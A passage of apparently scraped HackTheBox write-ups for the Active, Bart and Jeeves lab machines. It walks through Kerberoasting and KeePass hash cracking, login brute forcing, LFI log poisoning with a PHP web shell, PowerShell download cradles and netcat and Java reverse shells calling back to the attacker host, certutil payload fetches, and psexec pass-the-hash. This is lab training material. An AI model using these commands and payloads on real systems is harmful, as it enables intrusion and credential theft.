8f2fa1b8dccdbb4d0e292305206296a2b Checking into the hashcat example hashes page we can see the above hash corresponds to the hash-mode 13100, Kerberos 5 TGS-REP etype 23. So let's try to crack this hash with hashcat : m4rc0ff@SittingDucks:~$ hashcat -m 13100 -a 0 UserSPNs.out /usr/share/wordlists/rockyou.txt --force hashcat ( v5.1.0 ) starting... <SNIP> $ krb5tgs $23$* Administrator $ACTIVE .HTB $active /CIFS~445* $e7d1aaeab1d15b9f580ac541730fc7a7$42 c4e2f8f77a818dfa8b88b8ed54a89c1a84c36d60b01f90f65efb71b709260a856eff3c4f1858c07fa637cf22621648dd996d6e95b0c8a84a9d68483939da6a122f1a98d6f6e8c601719515f3951c383dd4fc311067f5e1003ecbd6eeb9a80a9f22a621a12c128e8763755d000d4dac4e3caa00ed4e0a0e2c8f603b0f3cbe85a7f755a9cc51bef72cceac934fd64d61de350170a7fadb686f361fe8d0b949733d1ebf87a22ecb7fe7c1a8912bbf69b32665f8d55523e8078e1a4b0e314a52bfda7785514bc77a97c6ac2ce6c04efff310cb095d1edc75925608a3dde886474ba05c2902db8e8a767a732edad05f65b5ed5f876fb70a1870ca2797d8938dae38e66a8092d99b403761f68e23a0f989e486a39456cfdc07cc36340f8da30061c6ed3c53e7060f5368ec945fcc3adfbbd83ddd7b28c339bde70c4f80c4f1c3fca28bc38f7a720ea206b3b434991737b25e931c3b6c7bd50adfb7eb5f99f904423383f5f30562bc9e8700a94b31c0830d7516f8f6ed7d2411083a5fb1a3ef074064364a11e0e4a3b3bc7766e3ae74a4a13f01052e19fe8a010acffd0c0c994560ddb23c7b726a3ea74d518dce6d172e30941c793668aa4b257020ec8d589edfe5edad9e156d1fb39d8adef8d9b95f19629c3b27aba285ee5f8c453bab8bf2f8f7b202fd176d059d34960e05e1a6c242bf510505cda9ca25a5f1d2029981beafc561b1bb141bcbfcf8a89cf7444211357a241370835de474a4aac083a1d71b18f830ced2255326e018832577106d6cdd4e4c0fd88cb5729944168937f6b314e32b1a353953c8d8aa8dcec06d8d2a356b28cc17f55f0a9503ed3678c1c7c6ca7b7d950c0ce92a2c4fc7685c99c2f4aec07ffdbbddefa761691d43ec108506874976e059c847de84dfce0fe17d9fe151a14dc18c2d474e0c3680b0274981929bd0d994d2cb40e1d74f17a794f6101af5161b21ec1920317ffb9583598380d069412defccf3093ec63a9243ccb48f327ce7c7a9dc713db98c2588f28336262f8b331178eacb56f3f412e674ec1de244460514e0c90fd8a35e9cf7ab931370a4d26806f8b36c902cdbf9bd31b100912bf910986c7560a854d07a94c96246d0b6aec484cfc09c2fdc38c0aa07061dc21617bfc2c3a8c1c29b58f8df1d4105131c7b0d46e0564292c1236b64a097f3d9b9bdba499370bf57ddbfe4e4149dfa1aa95345480e087f982afee87d98be58f2fa1b8dccdbb4d0e292305206296a2b:Ticketmaster1968 hashcat found the password in few minutes, which is Ticketmaster1968 . With this administrative credentials we should now be able to connect to the Users share again and grab the root.txt flag. m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$ cat root.txt b5****************************8b We can also easily get a shell using another script from the impacket framework, psexec : m4rc0ff@SittingDucks:~/Tools/psexec$ ./psexec.py active.htb/administrator@10.10.10.100 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation Password: [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file FhkmrxYH.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service MzVf on 10.10.10.100..... [*] Starting service MzVf..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami nt authority\\system C:\\Windows\\system32>","tags":"blogging","loc":"https://sittingducks.io/Active.html","title":"Active"},{"url":"https://sittingducks.io/Bart.html","text":"Bart was not a straightforward box but I enjoyed it because there are so many things to learn. Recon is not immediate and need to fiddle a bit with directories. Then we have to brute force to get in the website forum page and once there we have an LFI to exploit to get a reverse shell. There are few ways to privesc including JuicyPotato although I used PowerUp to find admin credentials and use the latter to mount a share on localhost and get the flags. ┌─[m4rc0@SittingDucks]─[~] └──╼ $nmap -sV -sC -p- 10.10.10.81 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 05:55 BST Nmap scan report for 10.10.10.81 Host is up (0.11s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Did not follow redirect to http://forum.bart.htb/ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 281.23 seconds Nmap finds only port 80 open indicating there is an IIS v10 server running. I browse to http://10.10.10.81 and I can see I am re-directed to http://forum.bart.htb/ but I get a blank page. When this happens usually I need to add the name in the /etc/hosts/ file on my box. Once I did that I was able to view the forum: I start having a look at the web page while in parallel I run dirbuster to scan for directories an files in the site. After some time dirbuster finds few results: If I go to the /forum directory from my browser I end up on the same forum I found earlier. The other interesing directory is /monitor . As shown above we can see a PHP Server Monitor portal. I looked for exploits but I did not find anything useful. I abandoned this for a moment but I got back to it and decided to try to find a valid user which we can use to perfom a brute force attack later on. There is a \"Forgot password?\" option which requires to specify the username and the portal would send an email to that user with a link to reset the password. While looking at the forum page I saw different employee names with contact details. Amongst these there is the head of IT: Robert Hilton r.hilton@bart.htb I tried few combinations but got always an error: While looking at the forum page html source code I found this piece of code which is commented out: This reveals there is another user called \"Harvey Potter\" and he seems to be the developer which means he may be the one administering the site and the monitor portal. As there are quite few combinations I want to try I decided to use burp intruder to identify the correct user name instead of trying manually. So I created a text file containing these names: admin administrator monitor monadmin bart bartadmin siteadmin webmaster r.hilton@bart.htb r.hilton robert hilton h.potter@bart.htb h.potter Developer@BART dev devadmin potter harvey harveypotter Then I captured the http POST request with burp and sent it to the intruder module: in the \"Positions\" tab I make sure to make the user_name field a variable with these weird symbols highlighted. then in the \"Payloads\" tab I load the file containing the potential user names and I click on stack attack. The result is the following: The lenght is the same for all the names except for \"harvey\". When I try I see this: So finally we have a valid username, now we can try to guess some passwords and if we are not lucky launching a brute force attack. After very few attempts I managed to login, the password is \"potter\". Way too easy! NOTE: I had to add another entry in the /etc/hosts file for monitor.forum.htb . Once logged in I was able to see one server that the application is monitoring under the \"Servers\" page: to access that address I had to put another entry in the hosts file: Once done we are presented with an internal chat login form which requires other credentials. I tried the same process I used earlier to identify the username but I was not successful with that. I then launched dirbuster against that site but found nothing interesting. At this point I made an assumption that the username is again \"harvey\" and I used hydra to make a brute force attack: ┌─[✗]─[m4rc0@SittingDucks]─[~] └──╼ $hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post \"/simple_chat/login.php:uname=&#94;USER&#94;&passwd=&#94;PASS&#94;&submit=Login:Password\" Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-09 05:32:34 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 4725 login tries (l:1/p:4725), ~296 tries per task [DATA] attacking http-post-form://internal-01.bart.htb:80/simple_chat/login.php:uname=&#94;USER&#94;&passwd=&#94;PASS&#94;&submit=Login:Password [STATUS] 676.00 tries/min, 676 tries in 00:01h, 4049 to do in 00:06h, 16 active [80][http-post-form] host: internal-01.bart.htb login: harvey password: Password1 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-09 05:33:59 the assumption worked and the above output indicates the passwoed for the user \"harvey\" is \"Password1\". Once I log in there is a chat window where I am able to write stuff as shown above. While inspecting the page source I noticed this piece of code: < div id = \"log_link\" > < script > function saveChat () { // create a serialized object and send to log_chat.php. Once done hte XHR request, alert \"Done\" var xhr = new XMLHttpRequest (); xhr . onreadystatechange = function () { if ( xhr . readyState == XMLHttpRequest . DONE ) { alert ( xhr . responseText ); } } xhr . open ( 'GET' , 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey' , true ); xhr . send ( null ); alert ( \"Done\" ); } </ script > < a href = \"#\" onclick = \"saveChat()\" > Log </ a > </ div > The code above is for a function which objective is to save the content of the chat. It indicates that when a user clicks on the Log link, present on the right upper part of the chat page, a GET request to the URL http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey will be made with the 3rd parameter true and the following popup will be shown: Then a call back to the xhr.onreadystatechange function is made which \"alerts\" with the response text ( alert(xhr.responseText) ). If we visit the URL http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey we simply get 1 as result. The URL in question shows LFI (Local File Inclusion) characteristics. If an LFI vulnerability is present we would be able to include a local file in the filename parameter in a way that we would be able to read it and potentially manipulate it. If we try the source page itself as the local file to include, that is log.php we get the following: This indeed indicates an LFI (Local File Inclusion) vulnerability, that is we are able to include the file log.php and read the information it generates, in this case the user name ( harvey ) and the user agent, Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0 . We can now see if we can get code execution leveraging the LFI by poisoning the file with some code. The Poison HTB box write-up I wrote some time ago explains LFI and log poisining in more details if you would like to have a look. Let's get this into burp and modify the user agent field with a simple php code, that is <?php system($_GET['cmd']); ?> . I have also appended &cmd=whoami in the request and as a result I have obtained RCE into the victim box. The result on the right pane shows nt authority\\iusr is the user logged in the victim Windows box. At this point it will be fairly easy to get a shell and, of course, there are many ways. I take a nishang reverse powershell available in my ParrotOS box at /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 and I edit the content. All I need to do is basically add the following line at the bottom of the shell: Invoke-PowerShellTcp -Reverse -IPAddress 10 . 10 . 14 . 15 -Port 443 Then I host the shell on a python simple http server and a start a netcat listner. I get back to burp, instead of whoami I will now need to call the shell with this command: powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:8000/shell.ps1')\" I also had to URL-encode the above string (using CTRL+u). Once I sent the request I see nothing in the burp response panel but I go back to my box I see the shell: ┌─[m4rc0ff@SittingDucks]─[~] └──╼ $sudo nc -lvnp 443 [sudo] password for m4rc0ff: listening on [any] 443 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.81] 49895 Windows PowerShell running as user BART$ on BART Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\inetpub\\wwwroot\\internal-01\\log>whoami nt authority\\iusr The dir command shows us the log.php used for the LFI and also the log.txt . PS C:\\inetpub\\wwwroot\\internal-01\\log>dir Directory: C:\\inetpub\\wwwroot\\internal-01\\log Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 21/02/2018 19:44 Microsoft -a---- 17/05/2020 08:32 1545 log.php -a---- 17/05/2020 07:15 1091 log.txt -a---- 17/05/2020 08:28 99 loh.php There is also another file, loh.php . This is a typo I had done during my attempts indicating that the LFI gives also write permissions and we could have included and poisoned our own file: PS C:\\inetpub\\wwwroot\\internal-01\\log> type loh . php [2020-05-17 10:28:48] - harvey - Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0 Moving to the C:\\users directory we can see different users: PS C:\\users> dir Directory: C:\\users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 04/02/2018 21:58 Administrator d----- 02/10/2017 13:08 DefaultAppPool d----- 04/10/2017 08:40 forum.bart.local d----- 21/02/2018 21:39 h.potter d----- 24/09/2017 21:55 Harvey Potter d----- 04/02/2018 21:56 internal.bart.local d----- 04/10/2017 08:42 monitor.bart.local d----- 06/02/2018 10:15 privileged d-r--- 21/02/2018 21:45 Public d----- 02/10/2017 13:08 test I tried to access these folders but I got an access denied error PS C:\\users\\h.potter> dir : Access to the path 'C:\\users\\h.potter' is denied . At line:1 char:1 + dir + ~~~ + CategoryInfo : PermissionDenied: (C:\\users\\h.potter:String) [Ge t-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. Commands.GetChildItemCommand so we need to find a way to privesc even to get the user.txt . Now I was able to run Sherlock . I had to modify the script and add Find-AllVulns at the end of the file to invoke the Find-AllVulns function. PS C:\\inetpub\\wwwroot\\internal-01\\log>powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:8000/Sherlock.ps1')\" powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:8000/Sherlock.ps1')\" Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : 'mrxdav.sys' WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Not Supported on single-core systems Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Not Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Not Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h tml VulnStatus : Not Vulnerable Sherlock didn't bring home good results as shown above so I tried to run another recon script, PowerUp which is part of the PowerSploit suite. As per Sherlock I add Get-RegistryAutoLogon at the end of the script to see if there is that registry key which can help us to privesc. When running the script I did not get any results: PS C:\\> IEX ( New-Object Net . WebClient ). downloadString ( 'http://10.10.14.15:8000/PowerUp.ps1' ) \" PS C:\\> I think this may be related to my shell being 32-bit whereas the PowerUp script runs the registry function on the 64-bit system. We can check that easily with: PS C:\\inetpub\\wwwroot\\internal-01\\log>[Environment]::Is64BitProcess False so I decided to get a better shell by downloading a 64 bit version of netcat in the victim box with certutil and create another connection to my box. PS C:\\users\\public> certutil -urlcache -split -f http : // 10 . 10 . 14 . 15 : 8000 / nc64 . exe nc . exe **** Online **** 0000 ... b0d8 CertUtil: -URLCache command completed successfully. PS C:\\users\\public> dir Directory: C:\\users\\public Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 24/09/2017 19:35 Documents d-r--- 18/03/2017 21:03 Downloads d-r--- 18/03/2017 21:03 Music d-r--- 18/03/2017 21:03 Pictures d-r--- 18/03/2017 21:03 Videos -a---- 17/05/2020 08:42 45272 nc.exe PS C:\\users\\public> ./ nc . exe -e powershell 10 . 10 . 14 . 15 444 I get the shell and if I run the command again I get \"True\": ┌─[m4rc0ff@SittingDucks]─[~] └──╼ $sudo nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.81] 53721 Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\\users\\public> [Environment]::Is64BitProcess [Environment]::Is64BitProcess True PS C:\\users\\public> Alternatively we could have invoked PowerUp from C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe since this is a 64-bit process but I prefer to get a shell. Now I run PowerUp again: PS C:\\users\\public> IEX ( New-Object Net . WebClient ). downloadString ( 'http://10.10.14.15:8000/PowerUp.ps1' ) IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:8000/PowerUp.ps1') DefaultDomainName : DESKTOP-7I3S68E DefaultUserName : Administrator DefaultPassword : 3130438f31186fbaf962f407711faddb AltDefaultDomainName : AltDefaultUserName : AltDefaultPassword : This time the script worked. Now we have the Administrative credentials and need to find a way to get the flags. There are various ways to achieve that but probably a simple one is to use net use to connect to a share on the victim box using the administrator credentials. Although this method does not give us a full administraor shell, it should be enough to read the flags. PS C:\\> net use z: \\\\localhost\\c$ /user:administrator 3130438f31186fbaf962f407711faddb The command completed successfully. PS C:\\> Z: PS Z:\\> cd users\\administrator\\desktop PS Z:\\users\\administrator\\desktop> dir Directory: Z:\\users\\administrator\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/02/2018 12:51 32 root.txt PS Z:\\users\\administrator\\desktop> type root.txt 00****************************dc PS Z:\\users\\h.potter> type user . txt 62****************************0f","tags":"blogging","loc":"https://sittingducks.io/Bart.html","title":"Bart"},{"url":"https://sittingducks.io/Jeeves.html","text":"Jeeves was a cool box. I think getting the initial foothold is quite easy although I got a bit stuck looking for Jenkins version-specific exploits. This re-iterated the concept of exploring minutiously everything you have at your disposal. The second part, privesc to root, could have been done in several different ways but I decided to go for the intended way since it involved cracking a Keepass file which I hadn't done before. ┌─[m4rc0@SittingDucks]─[~] └──╼ $nmap -sV -sC -p- 10.10.10.63 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 04:55 BST Nmap scan report for 10.10.10.63 Host is up (0.11s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Ask Jeeves 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 50000/tcp open http Jetty 9.4.z-SNAPSHOT |_http-server-header: Jetty(9.4.z-SNAPSHOT) |_http-title: Error 404 Not Found Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 4h58m35s, deviation: 0s, median: 4h58m35s |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-29T08:56:58 |_ start_date: 2020-04-29T07:37:19 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 211.54 seconds nmap reveals there are two http servers, an IIS v10 running on the standard port 80, and a Jetty v9.4 running on port 50000. Navigating to the IIS webserver produces this result: I checked the links but they don't take me anywhere. Then I typed something into the seach box and hit \"Search\" and I get this: This looks like a weird output and looking better at it, seems it's an image rather than a real error. This is confirmed by looking at the page source where I can see this <img src=\"jeeves.PNG\" width=\"90%\" height=\"100%\"> . I decided to have a look a the other webserver, that is Jetty: At this stage I will run a directory scan against both webservers. The IIS scan took ages and in the end did not produce any result. Luckily I had this running in the background while checking other things. ┌─[✗]─[m4rc0@SittingDucks]─[~] └──╼ $gobuster dir --url http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.63 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/04/29 04:46:55 Starting gobuster =============================================================== =============================================================== 2020/04/29 05:29:41 Finished =============================================================== I then run the same command against the Jetty webserver: ┌─[✗]─[m4rc0@SittingDucks]─[~] └──╼ $gobuster dir --url http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.63:50000/ [+] Threads : 200 [+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/04/29 05:30:52 Starting gobuster =============================================================== /askjeeves (Status: 302) =============================================================== 2020/04/29 05:32:41 Finished =============================================================== Looking at \"/askjeeves\" I can see a Jenkins dashboard: Jenkins is a popular open source automation server. The dashboard shows that it's on version 2.87. I started looking for version specific exploits but found nothing. While exploring the web application I realized that I have access to many functions and I don't need to login, perhaps some kind of anonymous authentication enabled. Within the \"Manage Jenkins\" menu I found \"Script Console\". The description states that we can type in Groovy Scripts and execute it on the server. Groovy is basically a scripting language for Java. I started looking online how to execute commands using the Groovy language and I found this article which gives this example: println \"ls -l\".execute().text So because Jeeves is a Windows based box I change the command to this: println \"whoami\".execute().text The above figure shows that the command provided jeeves\\kohsuke as the output, indicating that we have code execution on the victim box. This is great because we will use it to get a shell. Keeping in mind the Groovy is based on Java, I decided to try a Java reverse shell and paste it in the Groovy \"Script Console\" and see what happens. I downloaded the following shell : String host = \"10.10.14.2\" ; int port = 443 ; String cmd = \"cmd.exe\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while ( ! s . isClosed ()){ while ( pi . available () > 0 ) so . write ( pi . read ()); while ( pe . available () > 0 ) so . write ( pe . read ()); while ( si . available () > 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close (); and after changing the IP address to my box IP and the port I want to use (443 in this case), I paste this in the \"Script Console\" box and click on run: ┌─[✗]─[m4rc0@SittingDucks]─[~] └──╼ $sudo nc -lnvp 443 sudo: unable to resolve host SittingDucks: Name or service not known listening on [any] 443 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.63] 49676 Microsoft Windows [Version 10.0.10586] (c) 2015 Microsoft Corporation. All rights reserved. C:\\Users\\Administrator\\.jenkins>whoami whoami jeeves\\kohsuke C:\\Users\\Administrator\\.jenkins> And eventually I get a shell back on a netcat listener I had already prepared, as shown above. I was also able to grab the user flag: C:\\Users\\kohsuke\\Desktop>type user.txt type user.txt e3****************************6a Now it's time to escalate privileges. I started enumerating again and noticed there is an interesting file in \"kohsuke\" documents directory: C:\\Users\\kohsuke\\Documents>dir dir Volume in drive C has no label. Volume Serial Number is BE50-B1C9 Directory of C:\\Users\\kohsuke\\Documents 11/03/2017 11:18 PM <DIR> . 11/03/2017 11:18 PM <DIR> .. 09/18/2017 01:43 PM 2,846 CEH.kdbx 1 File(s) 2,846 bytes 2 Dir(s) 7,525,322,752 bytes free CEH.kdbx is a KeePass password database file. If we manage to crack this file we will potentially find useful information or credentials which would allow us to root the box. To be able to do so we need to transfer this file on our attacking box so that we can use other tools to crack it. For the transfer I setup an smb server using a script beloging to the Impacket framework : ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves] └──╼ $sudo impacket-smbserver SittingDucksShare ~/Documents/htb/boxes/jeeves sudo: unable to resolve host SittingDucks: Name or service not known Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed On the victim box I can run this command to see the smb share: C:\\Users\\kohsuke\\Documents>net view \\\\10.10.14.2 net view \\\\10.10.14.2 Shared resources at \\\\10.10.14.2 (null) Share name Type Used as Comment ------------------------------------------------------------------------------- SITTINGDUCKSSHARE Disk The command completed successfully. and simply use copy to transfer the file to my machine: C:#Users#kohsuke#Documents>copy CEH.kdbx ##10.10.14.2#SittingDucksShare copy CEH.kdbx ##10.10.14.2#SittingDucksShare 1 file(s) copied. on my machine I can use keepass2john to convert the kdbx file to a hash we can try to crack: ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves] └──╼ $file CEH.kdbx CEH.kdbx: Keepass password database 2.x KDBX ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves] └──╼ $keepass2john CEH.kdbx CEH:$keepass$ *2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48 To crack the hash we can use hashcat . Before doing so I check the hashcat official wiki and grabbed the hash-mode for keepass, that is 13400 . ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves] └──╼ $hashcat -m 13400 keepassHash /usr/share/wordlists/rockyou.txt --force hashcat (v5.1.0) starting... OpenCL Platform #1: The pocl project ==================================== * Device #1: pthread-Intel(R) Xeon(R) E-2186M CPU @ 2.90GHz, 2048/5890 MB allocatable, 4MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 <SNIP> $ keepass $* 2 *6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1 Session..........: hashcat Status...........: Cracked Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES) Hash.Target......: $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea...47db48 Time.Started.....: Wed Apr 29 14:31:50 2020 (20 secs) Time.Estimated...: Wed Apr 29 14:32:10 2020 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2847 H/s (7.16ms) @ Accel:256 Loops:128 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 55296/14344385 (0.39%) Rejected.........: 0/55296 (0.00%) Restore.Point....: 54272/14344385 (0.38%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5888-6000 Candidates.#1....: 250895 -> grad2010 Started: Wed Apr 29 14:31:34 2020 Stopped: Wed Apr 29 14:32:12 2020 Even though I don't have a GPU, hashcat managed to crack the hash and did not take long! The password is moonshine1 . Now I use keepass to open the file and I provide the password just found when prompted: We have access to the file. In the C:\\Users directory on Jeeves I saw only two users, that is Kohsuke and Administrator so I am looking for Administrator password since we already have Kohsuke. Accordingly I take the \"DC Recovery\" password since the user is administrator and I try to login to Jeeves using another tool of the Impacket framework, psexec.py . ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves] └──╼ $psexec.py administrator:S1TjAtJHKsugh9oC4VZl@10.10.10.63 Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation [-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.) As shown above the authentication was unsuccessful. So I started looking at the other entries in the list on the Keepass file and found a hash within the \"Backup stuff\" entry. The hash is the following: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 . I was hoping this would be the Administrator hash so that we could use it to login. Looking at psexec.py help menu I can see this: ┌─[m4rc0@SittingDucks]─[~] └──╼ $psexec.py --help Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation <SNIP> usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH <SNIP> The expected format is LMHASH:NTHASH and I think the hash we got matched this format. The hash is indeed composed by the following two parts: LMHASH: aad3b435b51404eeaad3b435b51404ee NTHASH: aad3b435b51404eeaad3b435b51404ee We can confirm that by try to login using a pass-the-hash technique: ┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jeeves] └──╼ $psexec.py administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.63..... [*] Found writable share ADMIN$ [*] Uploading file PnwdEPCo.exe [*] 